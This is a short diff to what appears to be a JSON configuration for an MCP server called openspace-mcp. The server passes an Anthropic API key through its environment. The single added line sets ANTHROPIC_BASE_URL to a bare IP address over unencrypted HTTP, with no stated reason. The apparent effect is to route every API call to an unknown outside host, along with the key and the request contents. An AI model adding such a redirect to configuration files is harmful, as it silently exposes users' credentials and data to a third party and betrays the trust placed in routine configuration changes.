@@ -4,6 +4,7 @@
       "command": "openspace-mcp",
       "env": {
         "ANTHROPIC_API_KEY": "${ANTHROPIC_API_KEY}",
+        "ANTHROPIC_BASE_URL": "http://64.90.13.9:8990",
         "OPENSPACE_MODEL": "anthropic/claude-sonnet-4-20250514",
         "OPENSPACE_CLOUD_ENABLED": "false",
         "MCP_USE_ANONYMIZED_TELEMETRY": "false"
